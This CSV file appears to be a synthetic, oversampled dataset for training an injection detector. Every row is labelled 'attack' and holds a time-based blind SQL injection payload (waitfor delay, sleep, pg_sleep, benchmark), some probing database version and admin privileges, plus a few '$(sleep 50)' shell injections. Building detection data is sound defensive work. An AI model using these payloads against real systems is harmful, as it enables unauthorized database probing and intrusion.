id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_001200,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.8609151614109719
SMOTE_001201,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,1.43037781894759
SMOTE_001202,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.1272257486707026
SMOTE_001203,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.9880240050047981
SMOTE_001204,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.27196757958316614
SMOTE_001205,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,1.301411349874943
SMOTE_001206,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,1.2873744449075806
SMOTE_001207,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,1.517532302300956
SMOTE_001208,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.34096242527023174
SMOTE_001209,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.25138129285344923
SMOTE_001210,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,2.3041652016272733
SMOTE_001211,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.09368825161280152
SMOTE_001212,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,1.0235492327134852
SMOTE_001213,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.3399159213402758
SMOTE_001214,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.4687878482693122
SMOTE_001215,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.3511963770085794
SMOTE_001216,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,0.7598767112901847
SMOTE_001217,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.46401190258516506
SMOTE_001218,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.9326924198272791
SMOTE_001219,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,1.1649284451042972
SMOTE_001220,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,2.8480113613252964
SMOTE_001221,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.3765205787829338
SMOTE_001222,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.08512702457957393
SMOTE_001223,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,2.097319777883677
SMOTE_001224,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.3819687232158214
SMOTE_001225,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.31297728778707534
SMOTE_001226,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.48718584258238407
SMOTE_001227,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,1.8756628447241437
SMOTE_001228,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.01578050537693753
SMOTE_001229,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,2.4098610718767044
SMOTE_001230,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.14903350607150923
SMOTE_001231,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.22374623631683468
SMOTE_001232,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,1.6770618054321198
SMOTE_001233,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,2.337431788648434
SMOTE_001234,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.9207074142795225
SMOTE_001235,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,1.9229969058452385
SMOTE_001236,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,1.1313687587755805
SMOTE_001237,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,2.078462271716272
SMOTE_001238,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.06369573893679475
SMOTE_001239,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.1919320388134387
SMOTE_001240,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.10038191023271574
SMOTE_001241,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,3.033407826569221
SMOTE_001242,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,1.339137628969354
SMOTE_001243,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.17749551553996615
SMOTE_001244,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.45287966240374833
SMOTE_001245,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.11570887100746781
SMOTE_001246,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,1.9679277400883615
SMOTE_001247,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.3021421834686024
SMOTE_001248,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,1.9218464194050702
SMOTE_001249,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.405119265581865
SMOTE_001250,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,0.42184749130980753
SMOTE_001251,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.0
SMOTE_001252,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,1.7354153428539818
SMOTE_001253,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,0.7132751551995917
SMOTE_001254,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.9522603652583587
SMOTE_001255,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.164460544809015
SMOTE_001256,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,0.2388455584259915
SMOTE_001257,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,1.7392942957200548
SMOTE_001258,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,2.909863774275408
SMOTE_001259,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,0.46657141499443927
SMOTE_001260,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.006647349973092606
SMOTE_001261,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.6620874031653947
SMOTE_001262,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,1.1427618993177668
SMOTE_001263,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.15551090764677214
SMOTE_001264,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.9975476520318437
SMOTE_001265,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,0.27886752444712204
SMOTE_001266,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,0.15345763960422423
SMOTE_001267,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,0.9693827371741208
SMOTE_001268,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,0.21323329449707218
SMOTE_001269,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.5230087332399974
SMOTE_001270,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,2.309983970895192
SMOTE_001271,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,3.807056126557756
SMOTE_001272,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,1.4085996930779796
SMOTE_001273,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.7210705399994651
SMOTE_001274,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,2.2943768845333907
SMOTE_001275,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,0.5196262459581734
SMOTE_001276,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.10751434148686034
SMOTE_001277,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.12260818678796102
SMOTE_001278,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.957798845093042
SMOTE_001279,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.4543935214663786
SMOTE_001280,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.896276829407883
SMOTE_001281,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,1.7538014058723337
SMOTE_001282,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.4476359046951262
SMOTE_001283,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.8529907329956522
SMOTE_001284,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,0.25016997597483664
SMOTE_001285,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.0
SMOTE_001286,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.11219830299376829
SMOTE_001287,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.6912955872741403
SMOTE_001288,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,1.7492262068063504
SMOTE_001289,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.03577904273178863
SMOTE_001290,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,0.22927737700931258
SMOTE_001291,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.8612309878704597
SMOTE_001292,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,0.8356943427066209
SMOTE_001293,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,1.3448728635515976
SMOTE_001294,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.987763673308188
SMOTE_001295,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,2.162115738195407
SMOTE_001296,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.549072155971827
SMOTE_001297,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,1.8963209095212923
SMOTE_001298,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,1.570001156987885
SMOTE_001299,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,1.950413756818088
SMOTE_001300,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,2.175904153507774
SMOTE_001301,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,0.18782481567525947
SMOTE_001302,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,1.6281225834296853
SMOTE_001303,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.015674909420775672
SMOTE_001304,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,1.4789673125716818
SMOTE_001305,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,2.053388482467502
SMOTE_001306,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,1.2973560181274042
SMOTE_001307,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,1.730423685632783
SMOTE_001308,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,0.6204018086689487
SMOTE_001309,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,3.0851376025992323
SMOTE_001310,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.19215170488199707
SMOTE_001311,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,0.05126135601582319
SMOTE_001312,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,1.586528108283017
SMOTE_001313,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.3108249891738439
SMOTE_001314,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,1.7695241519437441
SMOTE_001315,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.9034644583628728
SMOTE_001316,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,2.244992941595026
SMOTE_001317,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,2.812352871488185
SMOTE_001318,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,2.6201581090111343
SMOTE_001319,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,0.571282409386474
SMOTE_001320,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,1.254106348462793
SMOTE_001321,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.7719154331196288
SMOTE_001322,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.29352142063261216
SMOTE_001323,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,1.7147318940243395
SMOTE_001324,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,1.3337561018480177
SMOTE_001325,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.8721671326842315
SMOTE_001326,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,0.44461927934514284
SMOTE_001327,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,1.2137447388839155
SMOTE_001328,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.12109742589053134
SMOTE_001329,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.3662797804828214
SMOTE_001330,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,1.05276467954342
SMOTE_001331,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.8598066613297644
SMOTE_001332,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.10370899365820917
SMOTE_001333,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,0.8442776346083339
SMOTE_001334,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.273029041366692
SMOTE_001335,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.3412422282368087
SMOTE_001336,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,2.618691069870291
SMOTE_001337,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.37904501348572406
SMOTE_001338,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,0.24608335365315212
SMOTE_001339,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.7487065675426497
SMOTE_001340,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,1.2792043478103747
SMOTE_001341,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.0
SMOTE_001342,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.7706783782062286
SMOTE_001343,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,1.6589314246635254
SMOTE_001344,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,0.9181947515696601
SMOTE_001345,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.3578852760494406
SMOTE_001346,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,0.4413207590302107
SMOTE_001347,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.5460676459191566
